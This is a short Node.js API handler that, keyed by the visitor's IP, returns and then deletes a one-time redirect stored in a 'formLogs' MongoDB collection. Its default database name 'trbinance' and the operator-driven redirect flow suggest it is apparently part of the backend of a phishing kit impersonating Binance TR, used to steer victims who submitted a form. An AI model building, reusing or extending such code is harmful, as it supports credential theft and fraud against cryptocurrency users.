const clientPromise = require('../lib/mongo');

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const ip = getClientIp(req);

    if (!ip || ip === 'unknown') {
      return res.status(200).json({ redirectTo: null });
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');

    const log = await logs.findOne({ ip }, { projection: { redirectTo: 1 } });

    if (!log || !log.redirectTo) {
      return res.status(200).json({ redirectTo: null });
    }

    // Redirect bilgisini al ve sil
    const redirectTo = log.redirectTo;
    await logs.updateOne(
      { ip },
      {
        $unset: { redirectTo: '', redirectAt: '' }
      }
    );

    return res.status(200).json({ redirectTo });
  } catch (err) {
    console.error('Check redirect error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};

